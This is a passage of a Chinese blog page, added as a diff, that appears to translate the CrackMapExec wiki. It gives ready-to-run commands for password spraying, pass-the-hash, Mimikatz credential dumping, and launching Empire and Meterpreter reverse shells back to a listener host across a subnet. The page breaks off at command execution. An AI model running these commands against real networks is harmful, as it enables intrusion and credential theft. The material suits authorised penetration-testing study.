@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, shrink-to-fit=no">
+    <meta name="referrer" content="origin">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <title>
+        
+            crackmapexec食用
+        
+    </title>
+    <link rel="shortcut icon" href="#"/>
+
+    <link type="text/css" rel="stylesheet" href="/font/LongCang.css">
+    <link type="text/css" rel="stylesheet" href="/font/Monda.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSansSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/NotoSerifSC.css">
+    <link type="text/css" rel="stylesheet" href="/font/Playball.css">
+    <link type="text/css" rel="stylesheet" href="/font/PTMono.css">
+    <link type="text/css" rel="stylesheet" href="/font/Roboto.css">
+    <link type="text/css" rel="stylesheet" href="/font/RobotoSlab.css">
+    <link type="text/css" rel="stylesheet" href="/font/Rosario.css">
+    <link type="text/css" rel="stylesheet" href="/font/UbuntuMono.css">
+
+    <link type="text/css" rel="stylesheet" href="/css/base.css">
+    <link type="text/css" rel="stylesheet" href="/css/code.css">
+
+    <script type="text/javascript" src="/js/jquery-3.4.1.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <a id="cover"></a>
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
+<div id="header" class="header">
+    <div class="vertical">
+        <div class="inner">
+            
+                <h1 class="header-subtitle">crackmapexec食用</h1>
+                <div class="header-subinfo">
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2023-10-24
+                        </span>
+                        
+                            <span id="/2023/10/24/crackmapexec食用/" class="leancloud_visitors" data-flag-title="crackmapexec食用">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/10/24/crackmapexec食用/"></span>
+                        </span>  
+                    </p>
+                    
+                        
+                            <span class="category-color">内网</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">内网</span>
+                        
+                    
+                </div>
+            
+        </div>
+    </div>
+    
+</div>
+<div id="container">
+    
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <p><strong><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec（CME）</a>是一款后渗透利用工具，可帮助自动化大型活动目录(AD)网络安全评估任务。其缔造者<a target="_blank" rel="noopener" href="https://twitter.com/byt3bl33d3r">@byt3bl33d3r</a>称，该工具的生存概念是，“利用AD内置功能&#x2F;协议达成其功能，并规避大多数终端防护&#x2F;IDS&#x2F;IPS解决方案。”</strong></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>重要：</strong>在以下所有Bleeding-Edge安装说明中，请注意传递给git clone命令的–recursive标志。该标志会让git自动下载CME所依赖的所有子模块。如果没有的话，安装将会失败。</p>
+<h2 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h2><p><strong>最新稳定版</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ apt-get install crackmapexec</span><br></pre></td></tr></table></figure>
+
+<p><strong>Bleeging-Edge</strong></p>
+<p>强烈建议使用<a target="_blank" rel="noopener" href="https://pipenv.readthedocs.io/en/latest/">pipenv</a>来安装CME，以避免依赖项与你的系统包产生冲突。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#~ apt-get install -y libssl-dev libffi-dev python-dev build-essential</span><br><span class="line">#~ pip install --user pipenv</span><br><span class="line">#~ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec</span><br><span class="line">#~ cd CrackMapExec &amp;&amp; pipenv install</span><br><span class="line">#~ pipenv shell</span><br><span class="line">#~ python setup.py install</span><br></pre></td></tr></table></figure>
+
+<h2 id="Debian-x2F-Ubuntu"><a href="#Debian-x2F-Ubuntu" class="headerlink" title="Debian&#x2F;Ubuntu"></a>Debian&#x2F;Ubuntu</h2><p>强烈建议使用<a target="_blank" rel="noopener" href="https://pipenv.readthedocs.io/en/latest/">pipenv</a>来安装CME，以避免依赖项与你的系统包产生冲突。</p>
+<p><strong>最新稳定版</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#~ apt-get install -y libssl-dev libffi-dev python-dev build-essential</span><br><span class="line">#~ pip install crackmapexec</span><br></pre></td></tr></table></figure>
+
+<p><strong>Bleeging-Edge</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#~ apt-get install -y libssl-dev libffi-dev python-dev build-essential</span><br><span class="line">#~ pip install --user pipenv</span><br><span class="line">#~ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec</span><br><span class="line">#~ cd CrackMapExec &amp;&amp; pipenv install</span><br><span class="line">#~ pipenv shell</span><br><span class="line">#~ python setup.py install</span><br></pre></td></tr></table></figure>
+
+<h2 id="Arch-Linux"><a href="#Arch-Linux" class="headerlink" title="Arch Linux"></a>Arch Linux</h2><p>强烈建议使用<a target="_blank" rel="noopener" href="https://pipenv.readthedocs.io/en/latest/">pipenv</a>来安装CME，以避免依赖项与你的系统包产生冲突。</p>
+<p><strong>最新稳定版</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install crackmapexec</span><br></pre></td></tr></table></figure>
+
+<p><strong>Bleeging-Edge</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#~ pip install --user pipenv</span><br><span class="line">#~ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec</span><br><span class="line">#~ cd CrackMapExec &amp;&amp; pipenv install</span><br><span class="line">#~ pipenv shell</span><br><span class="line">#~ python setup.py install</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mac-OSX"><a href="#Mac-OSX" class="headerlink" title="Mac OSX"></a>Mac OSX</h2><p>强烈建议使用<a target="_blank" rel="noopener" href="https://pipenv.readthedocs.io/en/latest/">pipenv</a>来安装CME，以避免依赖项与你的系统包产生冲突。</p>
+<p><strong>最新稳定版</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --user crackmapexec</span><br></pre></td></tr></table></figure>
+
+<p><strong>Bleeging-Edge</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#~ pip install --user pipenv</span><br><span class="line">#~ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec</span><br><span class="line">#~ cd CrackMapExec &amp;&amp; pipenv install</span><br><span class="line">#~ pipenv shell</span><br><span class="line">#~ python setup.py install</span><br></pre></td></tr></table></figure>
+
+<h2 id="Logs"><a href="#Logs" class="headerlink" title="Logs"></a>Logs</h2><p>CME输出的任何日志文件都将存储在~&#x2F;.cme&#x2F;logs中。</p>
+<h2 id="使用协议"><a href="#使用协议" class="headerlink" title="使用协议"></a>使用协议</h2><p>从v4开始，CME将其功能划分为简化&#x2F;组合&#x2F;模块化（simplify&#x2F;orginize&#x2F;modularize）参数解析和功能，并允许将CME的功能扩展至Active Directory之外。</p>
+<p>要使用特定协议，请运行：cme &lt;协议&gt; &lt;协议选项&gt;</p>
+<h2 id="查看可用协议"><a href="#查看可用协议" class="headerlink" title="查看可用协议"></a>查看可用协议</h2><p>运行cme –help将列出可用的常规选项和协议</p>
+<h2 id="查看协议选项"><a href="#查看协议选项" class="headerlink" title="查看协议选项"></a>查看协议选项</h2><p>运行cme <protocol> –help 查看指定协议所支持的选项。例如，查看所有SMB协议选项</p>
+<p>每个协议都支持以CIDR表示法，IP地址，IP范围，主机名或包含目标列表的文件格式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;protocol&gt; ms.evilcorp.org</span><br><span class="line">crackmapexec &lt;protocol&gt; 192.168.1.0 192.168.0.2</span><br><span class="line">crackmapexec &lt;protocol&gt; 192.168.1.0/24</span><br><span class="line">crackmapexec &lt;protocol&gt; 192.168.1.0-28 10.0.0.1-67</span><br><span class="line">crackmapexec &lt;protocol&gt; ~/targets.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用凭据"><a href="#使用凭据" class="headerlink" title="使用凭据"></a>使用凭据</h2><p>当你需要使用凭据时，你可以运行以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username -p password</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意1：</strong>使用包含特殊符号的用户名和密码时，请用单引号将它们包起来，这样shell才会将它们作为字符串解析。</p>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username -p &#x27;Admin!123@&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意2：</strong>由于Python的参数解析库中存在<a target="_blank" rel="noopener" href="https://bugs.python.org/issue9334">bug</a>，以短划线（ - ）开头的凭据将抛出至少一个参数错误消息。要解决此问题，请使用“long”参数格式指定凭据（请注意&#x3D;符号）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u=&#x27;-username&#x27; -p=&#x27;-Admin!123@&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用数据库中的凭据集"><a href="#使用数据库中的凭据集" class="headerlink" title="使用数据库中的凭据集"></a>使用数据库中的凭据集</h2><p>通过使用-id标志指定凭据ID（或多个凭证ID），CME将自动从后端数据库中提取该凭据，并用它进行身份验证：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -id &lt;cred ID(s)&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="爆破-amp-Password-Spraying"><a href="#爆破-amp-Password-Spraying" class="headerlink" title="爆破&amp;Password Spraying"></a><strong>爆破</strong>&amp;<strong>Password Spraying</strong></h2><p>所有协议都支持暴力破解和密码喷洒（Password Spraying）。有关使用特定协议进行暴力破解&#x2F;密码喷洒的详细信息，请参阅wiki的相应部分。</p>
+<p>通过指定一个文件或多个值，CME将使用指定协议自动爆破登录所有目标：</p>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username1 -p password1 password2</span><br><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username1 username2 -p password1</span><br><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u ~/file_containing_usernames -p ~/file_containing_passwords</span><br><span class="line">crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h2><p>从v3.1开始，模块的加载和使用方式发生了变化，以使CME更具可移植性并可被打包。</p>
+<p>v4.0的每个协议现在都可以拥有自己的模块集。</p>
+<h2 id="查看协议的可用模块"><a href="#查看协议的可用模块" class="headerlink" title="查看协议的可用模块"></a>查看协议的可用模块</h2><p>运行 cme <protocol> -L 查看指定协议的可用模块。</p>
+<p>例如，查看SMB协议的所有模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb -L</span><br><span class="line">[*] met_inject                Downloads the Meterpreter stager and injects it into memory</span><br><span class="line">[*] get_keystrokes            Logs keys pressed, time and the active window</span><br><span class="line">[*] empire_exec               Uses Empire&#x27;s RESTful API to generate a launcher for the specified listener and executes it</span><br><span class="line"></span><br><span class="line">-- SNIP --</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用模块-1"><a href="#使用模块-1" class="headerlink" title="使用模块"></a>使用模块</h2><p>运行 cme <protocol> &lt;target(s)&gt; -M <module name>。</p>
+<p>例如，运行SMB Mimikatz模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ crackmapexec smb &lt;target(s)&gt; -u Administrator -p &#x27;P@ssw0rd&#x27; -M mimikatz</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看模块选项"><a href="#查看模块选项" class="headerlink" title="查看模块选项"></a>查看模块选项</h2><p>运行 cme <protocol> -M &lt;模块名称&gt; –options 查看模块所支持的选项，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme smb -M mimikatz --options</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用模块选项"><a href="#使用模块选项" class="headerlink" title="使用模块选项"></a>使用模块选项</h2><p>使用-o标志指定模块选项。所有选项都以KEY&#x3D;value (msfvenom style)的形式指定。</p>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ cme &lt;protocol&gt; &lt;target(s)&gt; -u Administrator -p &#x27;P@ssw0rd&#x27; -M mimikatz -o COMMAND=&#x27;privilege::debug&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据库常规用法"><a href="#数据库常规用法" class="headerlink" title="数据库常规用法"></a>数据库常规用法</h2><p>CME会自动将所有使用&#x2F;转储的凭证（以及其他信息），存储在首次运行时设置的数据库中。</p>
+<p>从CME v4开始，每个协议都有自己的数据库。此外，v4引入了workspaces（类似于Metasploit）。</p>
+<p>有关特定协议数据库的详细信息和用法，请参阅Wiki的相应部分。</p>
+<p>所有workspaces及其相关数据库都存储在~&#x2F;.cme&#x2F;workspaces中。</p>
+<h2 id="与数据库交互"><a href="#与数据库交互" class="headerlink" title="与数据库交互"></a>与数据库交互</h2><p>CME附带了一个辅助命令行脚本cmedb，用于与后端数据库的交互。 键入命令cmedb进入命令shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#~ cmedb</span><br><span class="line">cmedb (default) &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Workspaces"><a href="#Workspaces" class="headerlink" title="Workspaces"></a>Workspaces</h2><p>默认workspace的名称为’default’（如提示中所示）。一旦你选择了workspace，那么你在CME中执行的所有操作都将存储在该workspace中。</p>
+<p>创建工作区：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmedb (default) &gt; workspace create test</span><br><span class="line">[*] Creating workspace &#x27;test&#x27;</span><br><span class="line">[*] Initializing HTTP protocol database</span><br><span class="line">[*] Initializing SMB protocol database</span><br><span class="line">[*] Initializing MSSQL protocol database</span><br><span class="line">cmedb (test) &gt;</span><br></pre></td></tr></table></figure>
+
+<p>切换工作区：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmedb (test) &gt; workspace default</span><br><span class="line">cmedb (default) &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="访问协议的数据库"><a href="#访问协议的数据库" class="headerlink" title="访问协议的数据库"></a>访问协议的数据库</h2><p>要访问协议的数据库，只需运行proto <protocol>，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmedb (test) &gt; proto smb</span><br><span class="line">cmedb (test)(smb) &gt;</span><br></pre></td></tr></table></figure>
+
+<p>正如你在提示中看到的那样，我们现在位于名为“test”的工作区中，并使用SMB协议的数据库。每个协议数据库都有自己的一组命令，你可以运行help命令来查看可用选项。</p>
+<p>有关特定协议数据库的详细信息和用法，请参阅Wiki的相应部分。</p>
+<p>切换协议数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmedb (test)(smb) &gt; back</span><br><span class="line">cmedb (test) &gt; proto http</span><br><span class="line">cmedb (test)(http) &gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMB协议"><a href="#SMB协议" class="headerlink" title="SMB协议"></a>SMB协议</h2><p><strong>Passing-the-Hash</strong></p>
+<p>CME支持使用带-H标志的Passing-The-Hash攻击通过SMB进行身份验证：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb &lt;target(s)&gt; -u username -H LMHASH:NTHASH</span><br><span class="line">crackmapexec smb &lt;target(s)&gt; -u username -H NTHASH</span><br></pre></td></tr></table></figure>
+
+<p><strong>NULL Sessions</strong></p>
+<p>你可以使用’’作为用户名和&#x2F;或密码，即空会话登录</p>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb &lt;target(s)&gt; -u &#x27;&#x27; -p &#x27;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用SMB数据库</strong></p>
+<p>待完成~</p>
+<p><strong>从Empire和Metasploit导入凭据</strong></p>
+<p>CME非常适合作为Exploit&#x2F;Post-Exploitation框架之间的“粘合剂”。为此我们添加了许多功能，以便尽可能轻松地让使用者从Empire和Metasploit导入凭据和信息。</p>
+<p><strong>从Empire导入凭据</strong></p>
+<p>cmedb命令行脚本可以使用它的RESTful API，直接导入存储在Empire数据库中的凭据，从而使Empire无缝重放转储凭据。有关cmedb脚本和CME数据库的更多信息，请参阅：<a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-the-Database">https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-the-Database</a></p>
+<p>首先，启动Empire的RESTful API服务器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#~ python empire --rest --user empireadmin --pass Password123!</span><br><span class="line"></span><br><span class="line">[*] Loading modules from: /home/byt3bl33d3r/Tools/Empire/lib/modules/</span><br><span class="line"> * Starting Empire RESTful API on port: 1337</span><br><span class="line"> * RESTful API token: l5l051eqiqe70c75dis68qjheg7b19di7n8auzml</span><br><span class="line"> * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)</span><br></pre></td></tr></table></figure>
+
+<p>CME用于向Empire的RESTful API进行身份验证的用户名和密码存储在~&#x2F;.cme&#x2F;cme.conf文件中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Empire]</span><br><span class="line">api_host=127.0.0.1</span><br><span class="line">api_port=1337</span><br><span class="line">username=empireadmin</span><br><span class="line">password=Password123!</span><br><span class="line"></span><br><span class="line">[Metasploit]</span><br><span class="line">rpc_host=127.0.0.1</span><br><span class="line">rpc_port=55552</span><br><span class="line">password=abc123</span><br></pre></td></tr></table></figure>
+
+<p>导入Empire的凭据，只需启动cmedb脚本并运行import empire命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#~ cmedb</span><br><span class="line">cmedb &gt; creds</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line"></span><br><span class="line">  CredID  Admin On     CredType    Domain           UserName             Password</span><br><span class="line">  ------  --------     --------    ------           --------             --------</span><br><span class="line"></span><br><span class="line">cmedb &gt; import empire</span><br><span class="line">[+] Empire credential import successful</span><br><span class="line">cmedb &gt; creds</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line"></span><br><span class="line">  CredID  Admin On     CredType    Domain           UserName             Password</span><br><span class="line">  ------  --------     --------    ------           --------             --------</span><br><span class="line">  1       0 Host(s)    hash        lab.local        yomama               e19ccf75ee54e06b06a5907af13cef42</span><br><span class="line">  2       0 Host(s)    plaintext   lab.local        yomama               P@ssw0rd         </span><br><span class="line"></span><br><span class="line">cmedb &gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>从Metasploit导入凭据</strong></p>
+<p>即将实现~</p>
+<h2 id="Getting-Shells-101"><a href="#Getting-Shells-101" class="headerlink" title="Getting Shells 101"></a>Getting Shells 101</h2><h2 id="Empire-Agent"><a href="#Empire-Agent" class="headerlink" title="Empire Agent"></a>Empire Agent</h2><p>我们可以使用empire_exec模块，来执行Empire Agent的初始stager。在后台，模块连接到Empire的RESTful API，并为指定的listener生成launcher并执行它。</p>
+<p>首先，设置一个Empire  listener：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(Empire: listeners) &gt; set Name test</span><br><span class="line">(Empire: listeners) &gt; set Host 192.168.10.3</span><br><span class="line">(Empire: listeners) &gt; set Port 9090</span><br><span class="line">(Empire: listeners) &gt; set CertPath data/empire.pem</span><br><span class="line">(Empire: listeners) &gt; run</span><br><span class="line">(Empire: listeners) &gt; list</span><br><span class="line"></span><br><span class="line">[*] Active listeners:</span><br><span class="line"></span><br><span class="line">  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target</span><br><span class="line">  --    ----              ----                                 -------   ------------   --------    ---------------</span><br><span class="line">  1     test              http://192.168.10.3:9090                 native    5/0.0                      </span><br><span class="line"></span><br><span class="line">(Empire: listeners) &gt;</span><br></pre></td></tr></table></figure>
+
+<p>启动Empire的RESTful API服务器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#~ python empire --rest --user empireadmin --pass Password123!</span><br><span class="line"></span><br><span class="line">[*] Loading modules from: /home/byt3bl33d3r/Tools/Empire/lib/modules/</span><br><span class="line"> * Starting Empire RESTful API on port: 1337</span><br><span class="line"> * RESTful API token: l5l051eqiqe70c75dis68qjheg7b19di7n8auzml</span><br><span class="line"> * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)</span><br></pre></td></tr></table></figure>
+
+<p>CME用于向Empire的RESTful API进行身份验证的用户名和密码存储在~&#x2F;.cme&#x2F;cme.conf文件中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Empire]</span><br><span class="line">api_host=127.0.0.1</span><br><span class="line">api_port=1337</span><br><span class="line">username=empireadmin</span><br><span class="line">password=Password123!</span><br><span class="line"></span><br><span class="line">[Metasploit]</span><br><span class="line">rpc_host=127.0.0.1</span><br><span class="line">rpc_port=55552</span><br><span class="line">password=abc123</span><br></pre></td></tr></table></figure>
+
+<p>然后运行empire_exec模块，并指定listener名称：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ crackmapexec 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test</span><br></pre></td></tr></table></figure>
+
+<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>我们可以使用metinject模块，使用PowerSploit的Invoke-Shellcode.ps1脚本直接将meterpreter注入到内存。</p>
+<p>首先，设置handler处理程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_https</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.10.3</span><br><span class="line">LHOST =&gt; 192.168.10.3</span><br><span class="line">msf exploit(handler) &gt; set exitonsession false</span><br><span class="line">exitonsession =&gt; false</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started HTTPS reverse handler on https://192.168.10.3:8443</span><br><span class="line">msf exploit(handler) &gt; [*] Starting the payload handler...</span><br></pre></td></tr></table></figure>
+
+<p>然后运行metinject模块，并指定LHOST和LPORT的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#~ crackmapexec 192.168.10.0/24 -u username -p password -M metinject -o LHOST=192.168.10.3 LPORT=8443</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>在Windows系统上执行命令需要拥有管理员凭据，CME会在身份验证成功时通过向输出添加 ‘(Pwn3d!)’ 来自动告诉你正在使用的凭据集是否具有对主机的管理访问权限。</p>
+<p>有关如何使用凭据的详细信息，请参阅凭据部分。</p>
+<h2 id="执行方法"><a href="#执行方法" class="headerlink" title="执行方法"></a>执行方法</h2><p>CME有三种不同的命令执行方法：</p>
+<p>1.wmiexec：通过WMI执行命令</p>
+<p>2.atexe：通过Windows任务调度程序调度任务来执行命令</p>
+<p>3.smbexec：通过创建和运行服务来执行命令</p>
+<p>默认情况下，CME将按以下顺序执行命令（如果失败逐一尝试）：</p>
+<p>1.wmiexec</p>
+<p>2.atexec</p>
+<p>3.smbexec</p>
+<p>如果你想要指定命令执行的方法，可以使用–exec-method标志。</p>
+<h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p>在下面的示例中，我们尝试使用-x标志在目标上执行whoami命令：</p>
